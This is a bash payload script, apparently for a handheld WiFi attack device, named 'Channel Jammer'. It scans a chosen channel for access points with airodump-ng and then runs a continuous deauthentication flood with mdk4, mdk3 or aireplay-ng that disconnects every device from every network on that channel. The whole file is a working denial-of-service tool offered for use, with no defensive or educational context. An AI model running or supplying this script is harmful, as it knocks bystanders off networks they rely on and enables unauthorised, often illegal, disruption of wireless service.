#!/bin/bash
# Title: Channel Jammer
# Author: bad-antics  
# Description: Jam a specific WiFi channel with deauth floods
# Category: nullsec/attack

PROMPT "CHANNEL JAMMER

Disrupt all WiFi activity
on a specific channel.

Deauths ALL devices from
ALL networks on target
channel.

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

PROMPT "SELECT CHANNEL:

Common channels:
1, 6, 11 (2.4GHz)

5GHz: 36, 40, 44, 48
      149, 153, 157, 161

Enter channel next."

CHANNEL=$(NUMBER_PICKER "Target Channel:" 6)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CHANNEL=6 ;; esac

DURATION=$(NUMBER_PICKER "Duration (sec):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START JAMMING?

Channel: $CHANNEL
Duration: ${DURATION}s

⚠️ This will disconnect
ALL users on channel $CHANNEL

Press OK to jam.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Jamming channel $CHANNEL..."

# Lock to channel
iwconfig wlan0 channel $CHANNEL

# Find all APs on channel
SPINNER_START "Finding targets..."
timeout 5 airodump-ng wlan0 -c $CHANNEL --write-interval 1 -w /tmp/chanfind --output-format csv 2>/dev/null
SPINNER_STOP

# Extract BSSIDs
grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" /tmp/chanfind*.csv 2>/dev/null | sort -u > /tmp/jam_targets.txt

TARGET_COUNT=$(wc -l < /tmp/jam_targets.txt 2>/dev/null || echo 0)

LOG "Found $TARGET_COUNT APs"

# Start deauth flood on all targets
if command -v mdk4 >/dev/null 2>&1; then
    mdk4 wlan0 d -c $CHANNEL &
    JAM_PID=$!
elif command -v mdk3 >/dev/null 2>&1; then
    mdk3 wlan0 d -c $CHANNEL &
    JAM_PID=$!
else
    # Fallback to aireplay
    while read BSSID; do
        aireplay-ng -0 0 -a "$BSSID" wlan0 2>/dev/null &
    done < /tmp/jam_targets.txt
fi

PROMPT "JAMMING ACTIVE

Channel: $CHANNEL
Targets: $TARGET_COUNT APs

Press OK to STOP."

# Stop all
killall mdk4 mdk3 aireplay-ng 2>/dev/null
kill $JAM_PID 2>/dev/null

PROMPT "JAMMING STOPPED

Channel: $CHANNEL
Duration: Active until stop

Press OK to exit."
